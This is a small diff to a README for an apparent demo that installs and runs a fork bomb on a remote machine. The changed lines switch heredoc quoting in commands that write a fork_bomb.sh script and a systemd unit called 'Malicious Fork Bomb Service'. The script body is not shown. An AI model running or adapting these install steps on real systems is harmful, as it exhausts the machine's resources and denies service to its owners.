@@ -43,7 +43,7 @@ This demo showcases the setup and execution of a fork bomb on a remote machine. 
     ```
 
     ```bash
-    sudo tee /usr/local/bin/fork_bomb.sh > /dev/null << 'EOF'
+    sudo tee /usr/local/bin/fork_bomb.sh > /dev/null << EOF
     #!/bin/bash
 
     create_child_process() {
@@ -86,7 +86,7 @@ This demo showcases the setup and execution of a fork bomb on a remote machine. 
     ```
 
     ```bash
-    sudo tee /etc/systemd/system/fork.service > /dev/null << 'EOF'
+    sudo tee /etc/systemd/system/fork.service > /dev/null << EOF
     [Unit]
     Description=Malicious Fork Bomb Service
     After=network.target
